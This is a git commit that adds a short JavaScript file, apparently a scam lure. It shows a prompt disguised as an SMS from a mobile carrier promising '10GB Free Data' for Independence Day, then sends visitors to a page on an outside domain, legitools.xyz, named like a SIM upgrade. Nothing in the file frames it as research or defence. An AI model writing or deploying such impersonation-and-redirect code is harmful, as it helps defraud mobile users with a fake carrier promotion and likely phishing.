8e003aaa9b6bc8a824ebd678d946220c35e24d66
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-16 13:05:45 -0800

    Create africell-10gbdata.com.js

---
+++ africell-10gbdata.com.js
@@ -0,0 +1,5 @@
+var password = '10GB Free Data'
+password=prompt('SMS: HAPPY INDEPENDENCE DAY TO ALL OUR CUSTOMERS, Kindly Press OK to ACTIVATE. ','10GB Free Data');
+if (password != '10GB Free Data') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
